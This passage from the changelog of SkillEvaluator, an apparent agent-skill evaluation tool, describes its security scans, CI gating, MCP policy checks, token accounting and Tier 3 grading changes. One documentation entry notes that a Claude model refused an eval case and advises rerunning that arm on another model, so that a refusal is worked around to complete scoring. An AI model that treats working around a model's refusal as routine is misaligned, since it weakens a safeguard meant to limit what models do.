  script references are checked too; generated prompts avoid skill scripts.
  Older datasets may need outcome-only wording to pass strict CI preflight.

- Classify explicit `SKILL.md` ownership contacts (`metadata.pic` and
  `metadata.email`) as `PII.ownership_emails`, still HIGH by default. Add
  `--policy` to `tier1` and `tier1 validate` so operators can permit reviewed
  ownership metadata without allowing ordinary email occurrences.
- Retain bounded SkillSpector completeness diagnostics in JSON reports and
  show file/line, phase, and reason in incomplete-scan errors. Preserve details
  across scan stages, folder aggregation, and policy application.

- Add an `error_handling` section to the `--quality-config` file for
  Reliability's three error-handling rules: the `SKILL.md` mention check and
  the `scripts` and `lib` code checks. Each sets `points`, `message`,
  `suggestion`, and its `terms` or `markers`; `points: 0` turns a rule off.
  The section is optional and merges with the packaged values. A custom file
  may now also omit `expected_headers`, which then falls back to the packaged
  heading list; a list you set still replaces it and `[]` still turns heading
  checks off. Without a
  custom file, scores and findings are unchanged. The packaged
  `quality_config` digest changes once, because `quality-default.yaml` gained
  the section. A custom file's digest covers only the rules that file sets, so
  existing custom files keep their digests and a digest changes only when the
  file's rules change.
- Tier 3 reports show token usage per case, per agent and over all agents, as
  a measurement that is not scored. The JSON payload gains `token_usage`;
  `BENCHMARK.md` gains a **Token Usage** section; the Markdown report, the HTML
  report (under Measured Agent Resources), `validate --verbose` and
  `tier3 evaluate --verbose` show the same numbers. Cached tokens are part of
  the prompt and are not added again. Attempts that failed before scoring count
  as usage. Missing counters leave a partial total and are never estimated.
  The with-skill change needs complete counts for the same attempts in both
  arms, and both arms must have succeeded. Token usage never displaces score
  evidence: it joins the report payload last, and its case rows, then its sums,
  are left out, with a note, when the payload would pass its size or node
  limits, also after the run's next steps, `tier3 evaluate`'s case findings and
  `validate`'s applicability fields join it. A baseline that did not run is
  shown as not run, and a reused baseline's tokens are marked as used in the
  run it came from.

- Capability-gated CI onboarding for protected Tier 1 `--llm`/SkillSpector
  checks, independent Tier 3 gateway/judge settings and native agent models.
  Combined reports retain source-bound `BENCHMARK.md` cards for every outcome;
  GitHub can optionally propose eligible cards through a separate trusted
  benchmark-update PR. Tier 2/3 remain advisory for CI. Retained JSON preserves
  Tier 1 required-check and unscanned-content scope for publication decisions.
  The repository's own candidate CI selects Build for Tier 1/2 and separate
  gateway-backed Claude Code/Codex models for Tier 3, without changing upstream
  provider defaults. With the default `scan-mode: auto`, a merge request or
  same-repository pull request that changes no file under a configured skill
  root skips the paid jobs (LLM-enriched Tier 1, Tier 2 and Tier 3): the keyless
  scan remains the Tier 1 gate and reports list Tier 2 and Tier 3 as skipped.
  GitHub fork PRs never run the paid tiers and keep their existing Tier 2/3
  reason. Setup guidance explains when provider configuration is exercised and
  how to request an eligible all-skill check before merging.
  When tiers run, GitLab keyless and native selectors both include changed
  setup gitlinks despite committed submodule ignore settings.

- HTML, Markdown, and terminal findings show recorded LLM verification verdicts,
  confidence, and reasoning, with an explanation of retained or downgraded severity.
  Medium-confidence false positives and uncertain verdicts retain existing gates.
  Repeated occurrences with the same verification decision remain grouped in HTML.

- A reproducible public terminal starter runs the released CLI against the
  bundled text-analyzer skill, checks real script/report output and a seeded
  quality regression, and retains an editable task, fixture and run receipt.
  The walkthrough connects setup, interpretation, live-evaluation prerequisites,
  troubleshooting and adaptation; contributor guidance clarifies environment
  setup, example verification and the existing DCO policy.

- Tier 3 datasets can declare deterministic behavior checks for script invocation and success, workspace files, and final-response text.

- Tier 3 `evaluate --compare-to RUN` and read-only `compare-versions` compare
  compatible retained skill versions, report paired per-agent deltas and
  regressions, and keep version comparisons separate from no-skill Skill Lift.

- Add opt-in `tier3 interact` experiments for two or more skills. The command
  uses one reviewed task suite and a fixed attempt budget to compare baseline,
  individual, and combined performance. It reports the departure from additive
  gains and retains source identities and trial evidence. Invalid inputs exit
  with code 2. Incomplete or incomparable experiments and output I/O failures
  exit with code 1. Configuration failures identify their arm, trial progress
  uses stderr, and output roots honor `SKILLEVALUATOR_RESULTS_DIR` with canonical
  paths. Documentation describes trial noise and sequential configuration order.

- Read-only Tier 3 `history` lists retained Skill Lift runs chronologically,
  separates incompatible configurations into segments, preserves unavailable
  lift as missing, and exports JSON, CSV, or Markdown summaries.

- Tier 3 `evaluate --reuse-baseline RUN` reuses compatible retained fresh
  without-skill evidence, preserving lift calculations and baseline provenance.
  `latest` searches completed runs and falls back to a fresh baseline when needed.

- `tier3 validate-grader` qualifies the shipped verifier against independent
  versioned labels, with offline suite checks, repeated-grading statistics,
  provenance, optional rate gates and a bundled public reference suite.

- JSON reports record the SkillEvaluator `version` that wrote them, the
  `target_path` (the absolute path or Git remote URL from `validate`, the path
  as given from `tier1` and `tier2`, and `null` from single-check commands such
  as `security-scan`), and `top_issues`, the grouped issue rows across every
  tier that the HTML report data carries, without their page anchors. Each
  `gating.tiers` entry adds `validator_policies`, which says for each check
  whether it gates the exit code; the tier's `blocking` is `true` when any one
  of them does. The keys are additive, and existing keys keep their shape.
  Local skill aliases such as `.` retain the folder name in `skills`, and
  native Tier 3 CI reports retain their single skill identity. Published CI
  JSON omits absolute host `target_path` values.

- Import production trace exports into redacted review candidates with
  `tier3 import-traces`, then promote only explicitly human-reviewed expectations
  and replay fixtures with `tier3 accept-traces`.

- Tier 3 evaluations support token, judge-call, attempt, and priced-cost budgets.

- `--tolerate-baseline-timeouts` (and `harbor.tolerate_baseline_timeouts` in
  `evals/config.yml`) keeps a Tier 3 agent scored on its clean with-skill arm
  when its only baseline failures are attempts that hit the agent execution
  timeout while the agent was still producing output. By default one such
  attempt still fails the agent and the whole run. The option needs both arms
  run in the same run (not a `--reuse-baseline` baseline), standard dimension
  grading, every other agent completed (at least one with both arms) and no
  other launch errors; attempts a cost limit left `not_run` are not counted as
  missing. It refuses a timeout whose logs show a known provider overload,
  rate limit, quota or authentication error, and it does not cover native
  multi-step tasks. The baseline condition stays
  `failed`, baseline scores and Skill Lift are not reported for that agent, the
  run's best agent, overall score and verdict come from the agents with a
  complete baseline, reports name the tolerated agent in a "Baseline
  incomplete" note, the run lists a warning, and the run is still not complete
  publication evidence.

- Tier 3 reports list up to three run-level **Next steps** under the per-case
  fixes in the terminal, `report.html` and the Markdown report: re-run an
  incomplete run, add attempts for inconsistent cases, add cases or negative
  controls, or compare agents and models. Each step names its target
  (evaluation, dataset or agent), the observed problem and evidence, the action,
  and the check that would show improvement. Steps about agents or models are
  marked as hypotheses to test, steps from incomplete runs as limited, and none
  suggest removing cases or loosening expectations. The rules need no LLM; the
  Tier 3 payload carries them as `next_steps`.

- Document per-agent Tier 3 `findings.json` artifacts and distinguish advisory
  metric severity from dimension verdicts; include severity thresholds in the
  artifact and a muted CLI legend without changing scores or thresholds.

- `tier3 import-metrics` accepts versioned, normalized per-case custom scores
  from external evaluations and writes clearly labeled JSON/Markdown reports.
  Imports validate identities, metric metadata and values, retain declared
  provenance and source hashes, and compute custom lift only on matched
  case/attempt pairs, without assigning standard scores or claiming execution.

- Tier 2 context deduplication and `--llm-verify` name the model that
  answered. On the native Claude API, a server-side fallback model can answer
  in place of a configured Claude 5.5 or later model. A duplicate finding
  records the model that gave its verdict as `llm_model_used`, with
  `llm_provider`, in its metadata, and the Tier 2 `llm_analysis` object adds
  `models_used`, every model that gave a cluster's verdict.
  `llm_analysis.model` stays the configured model, and an `llm_refused`
  finding still names the configured model as `llm_model`. Each finding that
  gets an `--llm-verify` verdict records `llm_provider` and `llm_model_used`
  as well, including a verdict kept from a reply cut off at the output-token
  limit. A model name that is not a plain identifier, such as a URL or a key,
  reads `unresolved`.

- Show per-agent evidence volume next to Tier 3 scores: distinct cases, planned
  and scored attempts, execution and judge failures, and per-arm counts when a
  baseline ran. Flag limited case coverage or incomplete attempt coverage;
  distinguish uniform from early-stopped attempts, and retain case counts from
  legacy summaries where available.

- Report dataset sufficiency as sufficient or provisional using distinct-case,
  negative-case, Wilson interval, and paired-case coverage requirements. Show
  the dataset-size status in evaluation, validation, HTML, and BENCHMARK output;
  validation coverage notes remain informational.
- Experimental `hermes` Tier 3 agent for Docker and native NVIDIA Build routing,
  pinned to Hermes v2026.9.24. Includes isolated skill staging, ATIF trajectories,
  activation evidence, token accounting and retained execution diagnostics.
  Other providers/environments fail early; existing agent defaults are unchanged.
- Tier 3 generation provenance distinguishes LLM, requested-template, and
  template-fallback datasets, marks trace refinement and autopilot generation,
  and displays the source and review state in terminal, HTML, and BENCHMARK
  reports. Run payloads retain the generation record with shortened input hashes.

- `create-eval-dataset --grounding` selects skill, author-intent, or trace
  grounding. Generated datasets record relative input provenance and review
  flags for observed answers that differ from authored expectations and
  authored behavior steps omitted by refinement output.

- `tier3 validate` reports informational dataset coverage counts and concrete
  gaps in text and JSON. Generated one-case starters now explain their limits
  and point authors to full dataset generation and coverage validation.

- Collection similarity reports selected, indexed and skipped manifests with bounded
  exclusion reasons. Malformed selected manifests now make the scan incomplete and
  block catalog writes. A standalone synthetic scale benchmark records limits and
  stage measurements without provider requests. Reused Python registries now
  replace the complete selection on successful builds and preserve committed
  entries, vector dimensions and coverage together on failure; callers that
  relied on undocumented merging must pass their complete intended selection.

- Document an additive qualitative assessment review worksheet with bounded
  evidence from real successful, failed-setup and invalid-judge runs. Preserve
  numeric grading and identify the separate decisions needed for scoreless support.
  Pin the public calculator input to the historical repository revision used by
  the run, preserving its original hash and evidence pointers after migration.

- `skillevaluator tier3 migrate-dataset` previews lossless legacy conversions and
  writes only to an explicit new JSON/YAML destination. Authored routing, case
  IDs, fixture selectors, and extension metadata are preserved. The five bundled
  reference datasets now use the preferred object format; legacy reading remains
  supported.

- Tier 3 reports show per-case expectation inventories with explicit met,
  unmet, unchecked, unscored and inapplicable judgments, evidence and next
  diagnostic steps for executed conditions. Behavior judges can abstain when
  evidence is missing; partial results preserve every original requirement
  without presenting missing judgments as verified skill defects. Unexpected
  judge errors retain that inventory; intentionally skipped arms add no attempts.
- Repeatable Tier 3 activation-validation recipe and offline acceptance suite.
  Canonical trials separate expected target-skill use, trusted observed use or
  unknown traces, task correctness, workflow diagnostics, resources and retained
  evidence links. Fallback multi-step rows retain scoped observations without
  claiming complete logical-trial activation or changing numeric grading.
  Explicit `should_trigger` precedence is preserved, and standard baselines
  retain trusted trajectory observations independently of null/N/A skill scores.
  Primary skill identities match case-insensitively; accepted alternate use remains
  optional, including the legacy alternate field, without changing numeric grades.
  Unrendered activation diagnostics remain in canonical exports without consuming
  HTML overview or failure-reason preview budgets.
- The Tier 1 reusable workflow accepts `enforcement-mode: strict|advisory`
  (default `strict`). Opt-in `advisory` keeps complete policy/score failures
  non-blocking while retaining failed verdicts and reports and emitting a
  workflow warning.
  Configuration, scanner completeness, evidence, and runtime failures still
  block. Advisory mode requires supporting workflow and scanner image pins;
  the released 0.8.0 bundle does not accept this input.

- Run SkillEvaluator's own `skills/` through the pinned three-tier GitHub
  callers, retaining Tier 1 as required and Tier 2/3 as advisory. A separate
  consumer feedback listener preserves the reusable publisher's public path;
  onboarding and status recognize this filename collision without replacing
  reusable workflow definitions. Automatic comments activate after the
  listener reaches the default branch.
  Document independent chat, judge and agent model settings and model-availability
  troubleshooting for provider-backed CI.
- `skills/skillevaluator/` is an agent skill for operating SkillEvaluator: it
  routes requests to the right tier, readiness check, dataset, report, or CI
  command, and ships Tier 3 evaluation cases for itself. A test keeps every
  command and option it documents in sync with the CLI. The new "Evaluate from
  Your Agent" docs page shows how to install it in Codex, Claude Code, OpenCode,
  OpenClaw, and other skill-aware agents.

- Opt-in three-tier GitHub and GitLab CI entrypoints with required Tier 1,
  advisory Tier 2 and paired Tier 3, Docker and native local execution, pinned
  local agent bootstrap, retained aggregate/native reports, and trusted default-branch
  feedback. Candidate templates require a capability-bearing release descriptor;
  released Tier 1 bundles and workflows remain unchanged. Incomplete runs retain
  redacted startup diagnostics. Interrupted Tier 1 selections cannot pass on
  partial results; advisory tiers preserve their failed or incomplete status.
  GitLab callers quote variable values, use literal job timeouts
  compatible with GitLab 17.8, and safely select changes in runner-owned checkouts.
  GitLab before 18.4 uses a separate read-only admission credential; feedback
  initiation is advisory so first-install reporting does not change the tier gate.
  Same-project feedback uses the short-lived job-token trigger API and verifies
  the server-bound upstream pipeline and source job, preserving protected-branch
  and deployment permissions. Its persisted GraphQL MR association supports
  GitLab 17.x without requiring the newer pipeline/MR REST endpoint. Publisher
  failures include a trusted check location and finite diagnostic category.

- Private plugin helpers recognize native OpenClaw manifests
  (`openclaw.plugin.json`) after the existing manifest formats. `id` is the
  plugin identity and `configSchema` must be an object. Only the `skills` roots
  the manifest declares are members, searched recursively without implicit
  `skills/` or hidden and `node_modules` children. `package.json#openclaw`
  entrypoints are boundary-checked without being imported or run. Every native
  manifest keeps an unsupported OpenClaw runtime row, so portable skill
  results never certify tools, hooks, channels, providers or services. Inline
  `mcpServers` follow OpenClaw's transport, SSE default and verbatim-URL rules;
  disabled TLS verification and literal enterprise secrets are blocking.
  Runtime preparation never copies the plugin root as a member, never starts
  stdio servers whose plugin-root working directory cannot be kept, records
  unapplied host options as incomplete, and keeps host metadata out of staged
  manifests. Native Claude Code staging copies only the declared member
  skills, never the plugin tree, so Claude Code's default skill, command,
  agent, hook and `bin/` locations stay unloaded.
  `scripts/ci/smoke_openclaw_plugins.py` repeats these checks against real
  plugin sources without executing plugin code.

- Simplify repository CI onboarding around quality and security checks with
  no model key required,
  keeping optional LLM checks and hosted feedback separate. Preserve opt-in
  all-tier setup and report contracts in an Advanced CI reference.

- When the RAGAS goal scorer judges `goal_accuracy`, `judge_attempts.json`
  now saves each request it sends and the judge's reply, so a RAGAS score can
  be audited like the prompt judges' scores. Each request is a `ragas` entry
  with status `replied`, or `error` with the HTTP status and body or the
  reason the reply was not received, before the entry that holds the score or
  the problem. The prompts and replies are redacted and shortened like the
  other judge evidence. A failure while saving this evidence is only logged
  and never changes a score. The request entries do not count toward
  `--max-judge-calls`; the entry with the score or the problem is the one
  counted RAGAS call, as before.

### Changed

- A `PII.emails` severity override in `--policy` no longer applies to the
  `metadata.pic` and `metadata.email` contacts in a skill's own `SKILL.md`. They
  now report as `PII.ownership_emails`, HIGH by default, so a run that passed
  through that override fails until the policy also sets `PII.ownership_emails`.

- Remove `skillevaluator.quality_config.quality_config_provenance(path, config)`.
  Use `load_quality_config_with_provenance(path)` instead: it loads the config
  and returns `(config, provenance)`, and its digest covers only the rules a
  custom file sets. The report's `quality_config` field keeps its shape.
- Upgrade the Tier 3 backend to Harbor 0.25.0. Align supported sandbox
  constructor options with the release while reserving automatic mounts and
  host Compose environment forwarding for evaluator policy. Preserve local
  agent, verifier, and artifact evidence under Harbor's new mount checks, and
  retain explicit Codex gateway URLs, credential aliases, and full model identifiers.

- Tier 1 labels the `SKILL.md` token count as an estimate (characters / 4) in
  the Large skill finding, the HTML report and the docs, and adds
  `metrics.estimated_tokens` and `metrics.estimate_method` to the quality JSON.
  `metrics.total_tokens` keeps the same value and scoring is unchanged.

- Tier 1 skill-type detection and the script-based checks recognise Node scripts
  (`.mjs`, `.cjs`, `.js`) under `scripts/` and `tools/`, so a Node-script skill
  is no longer typed guide-only. A skill whose scripts are all Node scripts is not
  asked for a `run_script` call; one that also bundles Python or shell scripts
  keeps the check. Script lint still parses Python only and reports how many Node
  scripts it did not lint. The rubric judge also receives Node scripts and files
  from `tools/`. Scores of Node-script skills can change because they now get the
  script-based checks.

- Name Skill Lift as the headline comparison and label pass@k differences as
  supporting reliability across reports and terminal output.

- A scored Tier 3 attempt now fails when `goal_accuracy` or security is below
  1.0, even if its Overall score meets the pass threshold. N/A or unscored
  metrics preserve the existing verdict behavior; missed behavior-check steps
  are warnings. A with-skill required-check failure fails the quality verdict,
  while no-skill failures do not. Reports show required-check, goals-met,
  and security-clean counts for both arms, plus failed-case reasons.

- HTML and `BENCHMARK.md` reports explain each Tier 3 dimension in plain
  language with its evidence source and whether the run has a no-skill baseline
  for it. Dimensions that could not be scored or do not apply stay listed with
  the reason instead of disappearing or reading `Not available`, and baseline-only
  cards show the baseline score. A short key in both reports separates the
  verdict, dimension and overall scores, BENCHMARK Uplift, published Skill Lift,
  pass@k, the Tier 1
  Quality Score, and publication eligibility.

- Write Tier 3 accuracy deductions as plain-language reasons, identify findings
  without trajectory evidence, and include expected/observed text only when
  both values are recorded.

- Tier 3 LLM suggestions and insight recommendations now keep only evidence
  references the run recorded (cited references that don't resolve are
  dropped rather than shown as evidence) and keep one copy of a repeated
  suggestion. Insight recommendations that restate a deterministic one, or
  that loosen, relax, or lower an expectation, assertion, ground truth, or
  pass threshold, are dropped. Both prompts ask for distinct actions and
  label untested causes, such as switching to a different model, as
  hypotheses or experiments.
- Tier 3 reports missing skill runtime dependencies as environment problems,
  with declaration and custom Dockerfile guidance. Unrecovered environment
  failures leave the trial UNSCORED instead of reducing the skill's score;
  recovered environment failures carry no deduction.

- Document per-arm Tier 3 dimension applicability and test how N/A baseline
  metrics are handled in Overall scores and Skill Lift comparisons.
- Run GitLab Tier 2 without Docker-in-Docker while keeping TLS-protected Docker
  for Tier 3. Both native tiers retain shared caller timeout and runner-tag
  overrides, advisory outcomes, and aggregate artifacts; local mode still
  disables the Tier 3 Docker service.
- Align terminal grade and lift colors across compact, full, and direct Tier 3
  reports; displayed zero lift is neutral. Narrow terminals stack complete
  condition score/bar groups. Full-report Details retain successful quality and
  lift evidence without opening every success panel. Artifact footers show the
  emitted filenames, with links only on capable interactive terminals.

- Compact validation now writes durable tier/check starts, stage changes and
  measured milestones to stderr in CI, with deduplicated events and a heartbeat
  after 60 seconds without progress. Final report panels remain on stdout.

- Align final terminal and HTML command outcomes: Passed required checks,
  Changes required, or Incomplete. Keep publication eligibility and Best agent
  score separate. Tier counts exclude explicit N/A checks from execution;
  Tier 3 trial summaries use recorded condition counters before retained rows.

- Embed the verified Chart.js 4.5.1 runtime and its MIT notices in Tier 3 HTML
  reports so charts work offline without CDN or source-map requests. Charts
  include accessible descriptions, links to data tables and visible fallbacks
  when canvas initialization is unavailable; Tier 1 reports omit chart assets.

- Separate HTML Tier 2 evidence into within-skill and across-skill comparisons,
  with recorded completion, duplicate, affected-path, and catalog counts. Keep
  skipped or unavailable comparisons distinct from completed zero-match scans.
  Link every recorded Harbor job in HTML, terminal, and Markdown reports and
  disclose recorded scanner, evaluator, model, dataset, and source provenance.

- Give HTML summaries, tier tiles, KPI labels and values, findings, evidence
  tables and all six Tier 3 views more reading room. Use relaxed body line
  spacing and wrap Tier 3 navigation on narrow screens in both themes.

- Keep HTML tier navigation synchronized across sidebar, tiles and a mobile
  sticky bar, including absent tiers in comprehensive reports. Add accessible
  keyboard navigation for Tier 3 and agent tabs, a System/Light/Dark preference,
  complete expanded evidence, and readable no-JavaScript/print views. Keep
  required and advisory summary reasons distinct within mixed tiers and focus
  direct agent links on their named panels.

- Compact all-tier CI PR and MR feedback into one summary table with a row per
  skill, one-line tier statuses and issue counts, and one combined **Report**
  link per skill. Incomplete or missing evidence keeps issue counts unknown;
  detailed aggregate and native reports remain in the authenticated artifact.

- Make Tier 1 the only gate in opt-in all-tier GitHub and GitLab CI. Tier 2 and
  Tier 3 retain failed and incomplete advisory outcomes and native reports.
  Deprecate and ignore onboarding's `--tier3-required`, GitHub's
  `tier3-required` input and GitLab's `SKILL_EVAL_TIER3_REQUIRED` variable;
  none can make Tier 3 block CI. Standalone validation and benchmark
  publication policies are unchanged.

- Standalone `create-eval-dataset` and `DatasetOptions` now default to `auto`
  grounding: substantive author guidance beyond headings first, then usable
  matching retained trajectories from completed skill-scoped runs. Missing input
  fails before provider access, collection, or writes; existing skill-only scripts must pass
  `--grounding skill`, even with `--no-llm`. Auto trace selection preserves
  authored cases and flags unmatched coverage and observed answers for review;
  retained identity and trace files are checked before reading, and legacy
  `cases` wrappers retain root metadata when converted to `evals`.
  Provenance records the effective grounding and retained source hashes; auto
  trace refinement records template fallback and a safe reason when its LLM
  operation is unavailable or fails, preserving authored expectations and review
  state.
  Auto leaves existing datasets unchanged without `--force` or `--refine`,
  including when matching traces exist; explicit trace grounding still opts into
  in-place refinement. When auto selects traces, answer proposals that describe
  skill use leave the inferred expected outcome empty for independent authoring
  and review;
  existing authored expectations are retained. Recovery guidance and examples name
  usable author inputs, retained-results refinement, and explicit skill-only opt-in. Explicit grounding
  modes remain available. Unattended autopilot keeps its skill-grounded one-case
  starter behavior.

- Give staged Tier 3 main images a fixed liveness healthcheck so Docker Compose
  2 can wait for readiness while authored image healthchecks remain suppressed.
  Keep custom service healthchecks and their readiness dependencies intact.

- Generated eval datasets no longer grade skill use. Template cases from
  `create-eval-dataset`, and the one starter case that `validate`, `tier3` and
  `tier3 evaluate --autopilot` write when no dataset exists, asserted that the
  agent read `SKILL.md`, ran the skill's script, or used or identified the
  skill. The no-skill baseline is graded on the same expected output and
  assertions and could not meet them, so its `behavior_check`, `accuracy` and
  `goal_accuracy` scores dropped and lift was inflated. Template cases now
  describe only the task outcome, and do not quote a skill description that
  names the skill or its script; a template prompt calls a `SKILL.md` named in
  the description `my SKILL.md`. The LLM generation and `--refine` prompts ask
  for outcome checks, and template `--refine` no longer turns reads or runs of
  `SKILL.md`, the skill directory or the skill's scripts into behaviors. The
  autopilot starter case leaves out LLM or `EVAL.md` text that grades skill
  use, and `create-eval-dataset` prints a warning for each generated case that
  still grades it. The starter case from `init-custom-grader` and `init-harbor-task`
  asserts the task outcome instead of "using the relevant skill workflow". The
  negative template case is unchanged. `tier3 validate` now warns when a
  prompt points at the skill's files or an expected output or assertion grades
  skill use, including runs of the skill's own scripts. The warning fails
  `--strict` and the strict dataset check that all-tier CI runs before its
  advisory Tier 3 step; it never blocks a local run or autopilot. On newly
  generated datasets, baseline scores rise and lift falls; existing datasets
  are not rewritten.

- Tier 3 tool efficiency counts writing, editing and patching files, scoped
  native searches and listings (`Grep`, `Glob`, `LS`, OpenCode `list`, Codex
  `list_dir` and `grep_files`) and MCP tools named `mcp__server__tool` (Claude
  Code) as productive. An MCP filesystem search or listing whose `path` or
  `dir_path` is `/` is a root search and counts as waste. Most of these
  counted as wasted before, so a with-skill trial that read the skill, edited
  four files and ran the tests scored tool efficiency 0.33. Codex and OpenCode
  MCP calls, which are recorded under the bare tool name or as `server_tool`,
  are not recognized as MCP calls yet. Codex names with a namespace, such as
  `functions.apply_patch`, are classified by the bare name. Planning and
  bookkeeping calls (`TodoWrite`, `update_plan`, `TaskCreate` and
  `TaskUpdate`, background-shell polling such as `BashOutput`, and sub-agent
  calls) are left out of the score, and the reason says how many were not
  counted. A trial with only such calls scores 0.0, so a trial whose only
  calls were `BashOutput` or `KillShell` drops from 1.0 to 0.0. Polling a
  background shell no longer counts as running a command, while a command
  typed into a Codex `write_stdin` session or run by `Monitor` is classified
  like any other command. Help, version and install words are matched in
  commands only, so a file path or patch text that mentions `pip install` is
  not waste. Efficiency scores rise for write-, edit-, patch-, search- and
  MCP-heavy runs. Root searches in commands recorded as an argument list, such
  as Codex `["bash", "-lc", "find / -name x"]`, now count as waste, and so do
  help, version and install commands recorded that way, like the same command
  written as text.

### Documentation

- The 0.8.0 entry for refused `claude-code` attempts said the arm reports its
  coverage error, but `tier3 evaluate` does not print that error by default.
  After one refusal in 20 cases with 3 attempts each, the arm lacks complete
  attempt coverage, the run's `result.json` records
  `Scored attempt coverage is 59/60`, and `tier3 evaluate` exits 1, as does
  `validate --block-on-agent-eval`. `tier3 evaluate --verbose` lists the
  refused trial. Before 0.8.0, on a route that serves the fallback model, such
  as the Anthropic API, that model finished such an attempt and it was scored.
  Rerun the arm on another model with `--agent-model claude-code=MODEL`; the
  model is chosen per agent, not per case.

- The 0.8.0 entry for Tier 2 shared review blocks said a short text repeated
  under long headings stays inline. Once a cluster is over budget, heading
  length does not affect which repeated bodies are shared: the heading line
  stays with every occurrence either way, so a short body under short headings
  stays inline too.

- The 0.8.0 entry for capitalized `HTTP` method prose left out three forms
  that 0.8.0 still flags: a method word before a backtick word, such as an
  inline code span, as before a `$VAR` word; a Markdown table row with an
  `HTTP` word in any cell, because `|` reads as a pipe; and `HTTP PUT` right
  after a `;`, which starts a new command.

- Reports & Results now explains the completed-agent result in Tier 3 reports.
  When one of several agents fails, the HTML report and `tier3-benchmark.md`
  show the best agent's score when that agent's evidence is complete and mark
  it as needing attention, while the run stays failed and has no whole-run
  score. The new section says when an agent qualifies, how recovered timeout
  attempts are shown, and that the HTML lift card still shows the best agent's
  lift. The results tree now lists `tier3-benchmark.md`, which every Tier 3
  run, from `tier3 evaluate` or a `validate` run that includes Tier 3, writes
  as a pair with `report.html`, and the live evaluation guide says when its
  verdict table applies and links to the new section.

### Fixed

- Harbor local mode keeps exclusion and filtered download archives inside the
  allowed run directory, so pinned Harbor 0.25 transfers copy selected file
  contents without granting host `/tmp` access. Filters retain exact protected
  paths, and failed scans or unsafe destinations leave outputs untouched.

- Configure CLI stdout to replace characters that its encoding cannot
  represent, so reports and root help complete on legacy Windows code pages.
  JSON dataset previews and validation output preserve Unicode values, using
  readable characters when the output encoding supports them and escapes otherwise.

- Required Tier 3 judges recheck their wall-time deadline before accepting a
  result, including when a dependency or logging handler swallowed the timeout
  exception. Expired calls remain scoreless errors and restore their caller's
  deadline context.

- `skillevaluator view` no longer asks the LLM again when it regenerates a
  missing `report.html` for a Tier 3 run that saved its report feedback in
  `result.json`. The regenerated report shows the conclusions,
  recommendations, and suggestions that run produced, makes no LLM call, and
  reuses the run's `what_to_fix.json` when it has one. It also takes the run's
  duration and any Harbor log links recorded in `result.json`, which the 0.8.0
  rebuild left out. In 0.8.0 the Insights judge and the what-to-fix writer ran
  again: with a provider configured that cost tokens and could change the
  advice, without one the run's saved LLM advice was dropped, and either way
  `what_to_fix.json` was overwritten. Feedback saved by 0.6.0 or earlier has
  no per-case verdict, so the regenerated report adds the verdict and lists
  the case fixes as its recommendations and suggestions, without the LLM, as a
  new report does. A run that saved no feedback still has its feedback
  rebuilt, with the LLM when a provider is configured, and its
  `what_to_fix.json` rewritten.

- Generated Tier 3 images now build when any staged skill declares packages
  in `apt-packages.txt`. The generated `apt-get install` line ended the base
  package list with `\ \`, so the shell passed apt-get a package named " "
  and the build failed with `Unable to locate package`. This affected the
  shared eval base image, generated task Dockerfiles and the default
  Dockerfile for native Harbor tasks.

- Public MCP URL probes handle modern SDK client and stream APIs while retaining
  checked-address connections, header grants, response limits, and bounded
  cleanup. Redirect responses are refused before SDK-level redirect handling.
  Isolated wheel tests cover SDK 1.28.1 and 2.3.0; the supported Tier 3 dependency
  range remains unchanged.

- Apply the existing MCP declaration policy to native Harbor task environments
  before staging. Preserve approved `$VAR` header references by converting them
  to Harbor 0.25's `${VAR}` form in generated task TOML, without changing source
  declarations or agent JSON configuration.

- Validate native verifier and step-verifier MCP references against their
  verifier environment grants, retaining agent grants for agent servers and
  the legacy default when no separate verifier grants are supplied. Invalid
  declarations provide field/type and `${VAR}` hints without echoing values.

- Keep local `/logs/artifacts`, `HARBOR_LOGS_DIR/artifacts`, and
  `HARBOR_ARTIFACTS_DIR` on the same private staging tree. Artifact collection
  preserves source files and retained role logs; local whole-log-tree transfers
  fail before modifying their destination.

- With default or default-plus-custom grading, a Tier 3 task image now fails
  to build when `python3 -I` cannot import the verifier's packages: idna,
  openai, ragas or boto3. This happens, for example, when a custom Dockerfile
  sets `ENV PIP_USER=1`, or when the packages are reachable only through
  `PYTHONPATH`. The build-time import check ran plain `python`, which sees
  those locations. `test.sh` runs the verifier as `python3 -I`, which does not.
  Such images built, and then every trial's verifier failed on `import idna`,
  or the goal-accuracy judge fell back from RAGAS to the custom judge when only
  ragas was hidden. The check now runs as `python3 -I`. `custom_only` grading
  never runs that verifier, so its images no longer run the check.

- Repository CI can opt in to reviewed, per-skill SkillSpector baselines from
  the PR or merge request's target revision. Policy files from the proposed
  changes cannot approve their own exceptions.

- The `ci/gitlab/skill-evaluation.yml` template honors `TMPDIR` for temporary
  scan reports and defaults to `/tmp`.

- `skillevaluator validate` on a target with no skill, rules, workflows, or
  plugin, such as an ordinary source repository, no longer fails Tier 1 with
  three `No skills found` errors and exit 1 when every content scan passes.
  When `--type auto` detects the type as `unknown`, the `schema`, `version`,
  and `quality` checks are now recorded as not applicable, never as passes:
  the terminal summary and the HTML report count them as N/A, and the JSON
  and Markdown reports list them as skipped with a `not applicable` reason.
  The JSON report of every such run adds a root `tier1_applicability` object.
  The content scans still run with their unrestricted scope, so a real
  finding still fails the run; such a run is never eligible for publication.
  A target folder whose own `SKILL.md`, `workflow-rules.mdc`,
  `agent_plugin.yaml`/`.yml`, or `.claude-plugin/plugin.json` is mis-cased
  (such as `Skill.md`) or a dangling symlink still fails its manifest checks,
  and `--type skill` still validates the target as a skill.

- The unknown-artifact CLI guidance links to the published content-types documentation route.

- Security checks preserve authored evaluation files and their findings while
  excluding generated outputs. Fully inspected skills with only missing-path
  reference caveats retain visible warnings instead of an incomplete-scan
  failure; actual coverage gaps and analyzer failures still block.

- PII findings clarify that required author attribution is accepted while
  duplicate contact addresses need removal, replacement, or a reviewed waiver.

- Docker OpenCode containers no longer get the distribution `nodejs` and
  `npm` packages from agent setup, except on Alpine images, and generated
  images now include `procps`. Before, OpenCode, the default agent with NVIDIA
  Build, installed Debian's Node.js and npm with `apt-get` in every trial and
  then its own Node.js with nvm, and Claude Code installed `procps` (for
  `pgrep`) in every trial. Both took time from the 360-second agent setup
  timeout, and a package mirror error failed the trial. Like Claude Code and
  Codex containers since 0.6.0, OpenCode containers on Debian-based images now
  have no `gcc`, `g++`, or `make`, and OpenCode's Node.js is on `PATH` only for
  the OpenCode process and the commands it runs, including its stdio MCP
  servers. Skills whose scripts, tasks, or verifier need these tools, or whose
  stdio MCP servers need `gcc`, `g++`, or `make`, must install them through
  `scripts/apt-packages.txt` or a custom `evals/environment/Dockerfile`.
  Generated images rebuild once for the new package list: the per-task images,
